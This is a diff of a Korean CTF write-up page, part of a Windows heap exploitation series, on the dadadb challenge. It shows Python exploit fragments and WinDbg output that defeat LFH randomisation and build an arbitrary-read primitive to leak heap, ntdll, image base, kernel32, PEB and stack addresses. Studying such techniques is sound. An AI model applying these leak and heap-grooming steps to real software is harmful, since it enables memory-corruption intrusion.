@@ -310,7 +310,6 @@
 }
 
 <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">list</span>[256];</span></code></pre>
-
 <p><code>main()</code>&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>user.txt</code> &#xC758; &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xB85C;&#xADF8;&#xC778; &#xC258;&#xC744; &#xC5BB;&#xC740; &#xC774;&#xD6C4;&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%205.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%205.png"></p>
 <p>&#xC774;&#xC911; &#xC0C8;&#xB85C;&#xC6B4; node&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xB294; <code>add_sub_1340()</code> &#xD568;&#xC218;&#xB97C; &#xC790;&#xC138;&#xD788; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
@@ -351,7 +350,6 @@ login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&
 <span class="hljs-comment">## fill userblock</span>
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
 	add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)</code></pre>
-
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%209.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%209.png"></p>
 <p>LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; chunk&#xB4E4;&#xC774; &#xBB34;&#xC791;&#xC704;&#xB85C; heap&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xC5B4; chunk &#xAC04; &#xAC70;&#xB9AC;&#xAC00; &#xBD88;&#xADDC;&#xCE59;&#xD558;&#xBA74; &#xC6D0;&#xD558;&#xB294; chunk&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD55C;&#xB9C8;&#xB514;&#xB85C; &#xC6D0;&#xD558;&#xB294; heap layout&#xC744; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xC5B4;&#xC9C0;&#xC8E0;. &#xB530;&#xB77C;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;&#xB294; reliable &#xD55C; leak&#xC774; &#xBD88;&#xAC00;&#xB2A5;.. &#xD558;&#xC9C0;&#xB9CC;! &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC73C;&#xB2C8;&#xAE4C; &#xC774;&#xB7F0; &#xC0BD;&#xC9C8;&#xC744; &#xD558;&#xB294; &#xAC70; &#xC544;&#xB2C8;&#xACA0;&#xC5B4;&#xC694;?&#x314E;&#x314E;</p>
 <h2 id="LFH-Reuse-Attack"><a href="#LFH-Reuse-Attack" class="headerlink" title="LFH Reuse Attack"></a>LFH Reuse Attack</h2><p>&#xC790; &#xC774;&#xC81C; &#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xBC30;&#xC6B4; <a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation">reuse attack</a>&#xC744; &#xC368;&#xBA39;&#xC744; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. &#xBB34;&#xC791;&#xC704; &#xD560;&#xB2F9;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB420; chunk &#xC704;&#xCE58;&#xB97C; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xB2E4;&#xBA74;? &#xADF8;&#xB7FC; &#xB2E4; &#xCC44;&#xC6CC;&#xBC84;&#xB9AC;&#xACE0; &#xD55C; &#xACF3;&#xB9CC; &#xB0A8;&#xACA8;&#xB194;&#xC11C; &#xC608;&#xCE21; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p>
@@ -400,7 +398,6 @@ p.recvuntil(p64(<span class="hljs-number">0x90</span>))
 key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]
 print(<span class="hljs-string">&quot;heap : &quot;</span>,hex(heap_base))
 print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre>
-
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2015.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2015.png"></p>
 <p>&#xBC14;&#xB85C; &#xB4A4;&#xC5D0; &#xC788;&#xB294; chunk&#xC758; key&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; overflow&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; leak &#xD55C; key&#xC758; <code>data</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD558;&#xBA74; arbitrary read&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC8E0;! &#xC6B0;&#xB9AC;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
@@ -426,7 +423,6 @@ print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre>
 Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>)<span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>
 ntdll = Lock - <span class="hljs-number">0x163dd0</span> <span class="hljs-comment">#Lock - ntdll base address offset</span>
 print(hex(ntdll))</code></pre>
-
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2018.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2018.png"></p>
 <h2 id="Imagebase"><a href="#Imagebase" class="headerlink" title="Imagebase"></a>Imagebase</h2><p>ntdll &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xBA74; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; imagebase&#xB3C4; &#xAE08;&#xBC29; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; <code>PebLdr</code> &#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xAD6C;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p>
 <blockquote>
@@ -450,7 +446,6 @@ start             end                 module name
 ...
 <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fd`ea3f53c0 - <span class="hljs-number">00007f</span>fd`ea290000
 Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">001653</span>c0</code></pre>
-
 <p><code>PebLdr</code> &#xC740; <code>ntdll + 0x1653c0</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;. &#xADF8;&#xB7FC; <code>PebLdr</code>&#xC5D0;&#xC11C; &#xBB38;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC; dadadb&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <p>&#xBAA8;&#xB4C8;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xBA74; <code>ntdll!_PEB_LDR_DATA&#x2192;InMemoryOrderModuleList(+0x20)</code> &#xC5D0; &#xBA3C;&#xC800; &#xB85C;&#xB4DC;&#xB41C; &#xC21C;&#xC11C;&#xB300;&#xB85C; Double Linked List&#xB85C; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC2E4;&#xD589;&#xC911;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB3C4; &#xB2F9;&#xC5F0;&#xD788; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xACA0;&#xC8E0;?</p>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))
@@ -466,7 +461,6 @@ Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hlj
 <span class="hljs-number">00000185</span>`b0702688  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d1eb0 dadadb+<span class="hljs-number">0x1eb0</span>
 <span class="hljs-number">00000185</span>`b0702690  <span class="hljs-number">00000000</span>`<span class="hljs-number">00009000</span>
 ...</code></pre>
-
 <p>&#xC798; &#xC62C;&#xB77C;&#xC640; &#xC788;&#xB124;&#xC694;! </p>
 <pre><code class="hljs python"><span class="hljs-comment">#...</span>
 pebldr = ntdll + <span class="hljs-number">0x1653c0</span>
@@ -475,7 +469,6 @@ print(<span class="hljs-string">&quot;InMemoryOrderModuleList: &quot;</span>,hex
 imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)
 print(<span class="hljs-string">&quot;imagebase :&quot;</span>,hex(imagebase))
 <span class="hljs-comment">#...</span></code></pre>
-
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2019.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2019.png"></p>
 <h2 id="kernel32-base"><a href="#kernel32-base" class="headerlink" title="kernel32 base"></a>kernel32 base</h2><p>imagebase&#xB97C; &#xAD6C;&#xD588;&#xC73C;&#xB2C8; kernel32 base address&#xB294; IAT &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC27D;&#xAC8C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC790;&#xC138;&#xD55C; &#xBC29;&#xBC95;&#xC740; &#xC81C;&#xAC00; &#xC791;&#xB144;&#xC5D0; &#xCD9C;&#xC81C;&#xD55C; &#xBB38;&#xC81C;&#xC778; <a href="https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit">Christmas CTF 2020 - addressbook</a> write-up&#xC5D0; &#xC124;&#xBA85;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !dh <span class="hljs-number">00007f</span>f6`a72d0000
@@ -501,11 +494,9 @@ start             end                 module name
 
 <span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 - <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000
 Evaluate expression: <span class="hljs-number">140384</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">00022460</span></code></pre>
-
 <p><code>kernel32!ReadFile</code> &#xD568;&#xC218;&#xB294; kernel32 base&#xC758; <code>0x22460</code>&#xC5D0; &#xC704;&#xCE58;&#xD574; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python">kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span>
 print(<span class="hljs-string">&quot;kernel32 :&quot;</span>,hex(kernel32))</code></pre>
-
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2020.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2020.png"></p>
 <p>&#xC790; &#xC774;&#xC81C; &#xAC70;&#xC758; &#xB2E4;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;..!</p>
 <h2 id="PEB-Stack-address"><a href="#PEB-Stack-address" class="headerlink" title="PEB/Stack address"></a>PEB/Stack address</h2><p><code>!address -summary</code> &#xB85C; PEB&#xC640; TEB, Stack&#xC8FC;&#xC18C;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
@@ -520,7 +511,6 @@ Heap                                    <span class="hljs-number">275</span>`<sp
 Other                                  <span class="hljs-number">7</span>df5`<span class="hljs-number">5e0</span>a0000        <span class="hljs-number">0</span>`<span class="hljs-number">00033000</span> ( <span class="hljs-number">204.000</span> kB)
 TEB                                      e4`<span class="hljs-number">4f</span>9ca000        <span class="hljs-number">0</span>`<span class="hljs-number">00002000</span> (   <span class="hljs-number">8.000</span> kB)
 PEB                                      e4`<span class="hljs-number">4f</span>9c9000        <span class="hljs-number">0</span>`<span class="hljs-number">00001000</span> (   <span class="hljs-number">4.000</span> kB)</code></pre>
-
 <p>PEB&#xB294; ntdll&#xC758; bss &#xC601;&#xC5ED;&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xBA70; PEB &#xC8FC;&#xC18C;&#xB294; &#xC544;&#xAE4C; &#xAD6C;&#xD55C; <code>pebldr</code> &#xC8FC;&#xC18C; &#xADFC;&#xCC98;&#xC5D0; &#xC788;&#xC73C;&#xB2C8; &#xB4A4;&#xC801;&#xB4A4;&#xC801;&#xAC70;&#xB9AC;&#xBA70; &#xCC3E;&#xB2E4; &#xBCF4;&#xBA74; &#xB098;&#xC635;&#xB2C8;&#xB2E4; &#x314E;&#x314E;;</p>
 <pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm
 start             end                 module name    
@@ -536,14 +526,12 @@ start             end                 module name
 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805328  <span class="hljs-number">000000e4</span>`<span class="hljs-number">4f</span>9c9240
 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805330  <span class="hljs-number">00000000</span>`<span class="hljs-number">00620026</span>
 <span class="hljs-number">00007f</span>fd`<span class="hljs-number">4</span>d805338  <span class="hljs-number">00000275</span>`<span class="hljs-number">1</span>dfc2470</code></pre>
-
 <p><code>PEB+0x240</code>&#xC740; <code>ntdll+0x165328</code>&#xC5D0; &#xC788;&#xC73C;&#xBA70; TEB&#xB294; <code>PEB + 0x1000</code>&#xC5D0;, Stack address&#xB294; <code>TEB + 0x10</code>&#xC5D0; &#xC788;&#xC73C;&#xB2C8; &#xAC19;&#xC774; &#xAD6C;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python">peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>
 teb = peb + <span class="hljs-number">0x1000</span>
 stack = readmem(key, teb+<span class="hljs-number">0x10</span>)
 print(<span class="hljs-string">&quot;peb :&quot;</span>,hex(peb))
 print(<span class="hljs-string">&quot;teb :&quot;</span>,hex(teb))</code></pre>
-
 <p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2021.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2021.png"></p>
 <hr>
 <p>&#xB4DC;&#xB514;&#xC5B4;&#x3153;&#x3153;&#x3153; &#xC775;&#xC2A4;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xBAA8;&#xB4E0; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
